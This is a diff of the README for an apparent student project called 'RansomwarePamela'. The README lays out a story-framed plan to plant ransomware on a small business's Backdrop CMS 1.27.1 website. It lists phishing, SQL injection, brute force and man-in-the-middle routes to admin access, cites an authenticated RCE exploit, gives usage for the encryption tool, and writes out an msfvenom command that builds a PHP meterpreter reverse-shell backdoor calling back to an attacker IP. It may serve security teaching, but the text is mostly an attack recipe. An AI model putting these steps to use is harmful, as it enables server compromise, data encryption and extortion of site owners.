@@ -1,5 +1,30 @@
 # RansomwarePamela
 
+## CarDetailing Website Ransomware
+
+### Story
+
+Bob is a small business owner that specialises in car detailing. He has a simple website that allows customers to book their appointments and check information about the business. Because he is running on a small budget he didn't want to invest a lot of money in securing the website but rather have more functionality to serve the customers. Therefore, he hired a developer with the lowest bid he found on a website that offers different services. The website was developed using Backdrop, which is a free and Open Source Content Management System that helps you build modern, comprehensive websites on a reasonable budget. 
+
+Alice a competitor of Bob wants to learn some information about his business model, clients and make some money out of it in the meantime. Therefore, she takes advantage of the vulnerability in Backdrop CMS 1.27.1 to install ransomware inside Bob's server.
+
+#### Steps
+This section entails the five steps to successfully achieve the goal of this project, including gaining admin access, run the exploit to import a malicious PHP module. Finally, install and run the ransomware on the target server.
+  - Set up a website using Backdrop CMS 1.27.1, with a working database and basic functionality using Backdrop's installation guide here: https://docs.backdropcms.org/documentation/installation-instructions .
+  -  Gain admin access to the website. This can be done with one of the following options, but we chose to go with the last one:
+       - Brute force the credentials;
+       - SQL Injection to bypass authentication;
+       - Phishing : We could send him an email claiming that we are the person who was hired to develop the website. We will trick him using typosquatting in the email address and tell him that the website has a problem and he won't be able to serve his customers, so he needs to give us admin access to check it out.
+       - Man in the middle attack: We trick the user into thinking he communicates directly with the server by spoofing the server's address and forwarding traffic. This way we intercept the login and steal their credentials.
+- Use the exploit Backdrop CMS 1.27.1 - Authenticated Remote Command Execution (RCE) here: https://www.exploit-db.com/exploits/52021 . It allows an authenticated user (admin) to upload a malicious PHP module that can execute arbitrary commands on the underlying server. 
+- We can modify the malicious module to create a reverse shell to install the malware on the target server. 
+- The installed malware encrypts all files in Bob's server and demands a ransom in return for the decryption key.
+     when the ransom pops up on the screen, also does the rotating Pamela Anderson pictures in the background 
+
+The reason why we need the exploit even though we have admin privileges is because Backdrop CMS limits uploading files that suspects might be malicious even for admins. So the exploit tricks it into thinking that the file is legitimate.
+
+## Encryption/Decryption and Backdoor access
+
 How to run the encryption/ decryption with the shell file. 
 
 ./ransomware "mode" "traversing directory" "extentions" "key" "IV" 
@@ -36,30 +61,6 @@ If you want to stup the cron job run the command again and delete the added line
 To create the backdoor:
 1. msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.11 LPORT=4444 > backup.php (LHOST should be the IP of the attacker and the port is some arbitrary unused one)
 2. Open the corresponding msfconsole and access the file remotely for which no admin access is needed- that starts the web shell and exploits the backdoor
-=======
-
-## CarDetailing Website Ransomware
-
-### Story
-
-Bob is a small business owner that specialises in car detailing. He has a simple website that allows customers to book their appointments and check information about the business. Because he is running on a small budget he didn't want to invest a lot of money in securing the website but rather have more functionality to serve the customers. Therefore, he hired a developer with the lowest bid he found on a website that offers different services. The website was developed using Backdrop, which is a free and Open Source Content Management System that helps you build modern, comprehensive websites on a reasonable budget. 
-
-Alice a competitor of Bob wants to learn some information about his business model, clients and make some money out of it in the meantime. Therefore, she takes advantage of the vulnerability in Backdrop CMS 1.27.1 to install ransomware inside Bob's server.
-
-#### Steps
-This section entails the five steps to successfully achieve the goal of this project, including gaining admin access, run the exploit to import a malicious PHP module. Finally, install and run the ransomware on the target server.
-  - Set up a website using Backdrop CMS 1.27.1, with a working database and basic functionality using Backdrop's installation guide here: https://docs.backdropcms.org/documentation/installation-instructions .
-  -  Gain admin access to the website. This can be done with one of the following options, but we chose to go with the last one:
-       - Brute force the credentials;
-       - SQL Injection to bypass authentication;
-       - Phishing : We could send him an email claiming that we are the person who was hired to develop the website. We will trick him using typosquatting in the email address and tell him that the website has a problem and he won't be able to serve his customers, so he needs to give us admin access to check it out.
-       - Man in the middle attack: We trick the user into thinking he communicates directly with the server by spoofing the server's address and forwarding traffic. This way we intercept the login and steal their credentials.
-- Use the exploit Backdrop CMS 1.27.1 - Authenticated Remote Command Execution (RCE) here: https://www.exploit-db.com/exploits/52021 . It allows an authenticated user (admin) to upload a malicious PHP module that can execute arbitrary commands on the underlying server. 
-- We can modify the malicious module to create a reverse shell to install the malware on the target server. 
-- The installed malware encrypts all files in Bob's server and demands a ransom in return for the decryption key.
-     when the ransom pops up on the screen, also does the rotating Pamela Anderson pictures in the background 
-
-The reason why we need the exploit even though we have admin privileges is because Backdrop CMS limits uploading files that suspects might be malicious even for admins. So the exploit tricks it into thinking that the file is legitimate.
 
 
 # Recreating the whole Ransomware Attack
